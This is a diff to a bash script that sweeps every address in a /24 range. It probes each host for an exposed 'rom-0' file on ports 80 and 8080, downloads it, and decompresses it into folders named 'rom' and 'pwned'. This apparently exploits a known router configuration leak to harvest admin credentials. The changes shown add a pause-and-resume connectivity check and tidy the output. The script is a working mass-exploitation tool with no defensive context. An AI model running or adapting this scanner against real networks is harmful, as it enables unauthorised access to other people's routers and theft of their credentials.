@@ -1,9 +1,33 @@
 #/bin/bash
 
 prefix="$1"
-
+pausetime="5"
 mkdir -p "rom" "pwned"
 tanggal=$(date +%Y-%m-%d_%H%M%S)
+
+cekonline() {
+  if eval "ping -c 1 8.8.4.4 -w 2 > /dev/null 2>&1"; then
+    isonline="1"
+  else
+    isonline="0"
+  fi
+
+  if [[ $isonline -gt 0 ]]; then
+    if [[ $paused -gt 0 ]]; then
+      echo -e "\e[1;92m# OK Connected! \e[96m(Resuming scan..)\e[0;39m"
+      paused="0"
+    fi
+  else
+    if [[ $paused -gt 0 ]]; then
+      sleep $pausetime
+      cekonline
+    else
+      echo -e "\e[1;93m# WARNING: \e[0;93mCan't connect to internet! \e[96m(pausing untill connected..)\e[0;39m"
+      paused="1"
+      cekonline
+    fi
+  fi
+}
 
 decompress() {
   ./decompress "rom/$1" > /dev/null 2>&1
@@ -21,6 +45,9 @@ decompress() {
 
 for i in $prefix.{1..255}
 do
+  cekonline
+
+  echo -n "$i > "
   wget --timeout=2 --tries=1 --spider -rq -l 1 "http://$i/rom-0"
   EXIT_CODE=$?
 
@@ -32,7 +59,7 @@ do
 
       if [ $EXIT_CODE -gt 0 ];
         then
-          echo -e "$i > \e[31mFailed! -non vulnerable?- \e[0;39m"
+          echo -e "\e[31mFailed! -non vulnerable?- \e[0;39m"
       else
         wget -q "http://$i:8080/rom-0" -O "rom/$i" &
         PID=$!
@@ -41,7 +68,7 @@ do
         if [ "$PSPID" != "" ]; then
           # macet
           kill $PID > /dev/null 2>&1
-          echo -e "$i > \e[31mFailed! -timeout- \e[0;39m"
+          echo -e "\e[31mFailed! -timeout- \e[0;39m"
         else
           # ok
           # decompress 8080
@@ -57,7 +84,7 @@ do
     if [ "$PSPID" != "" ]; then
       # macet
       kill $PID > /dev/null 2>&1
-      echo -e "$i > \e[31mFailed! -timeout- \e[0;39m"
+      echo -e "\e[31mFailed! -timeout- \e[0;39m"
     else
       # ok
       # decompress
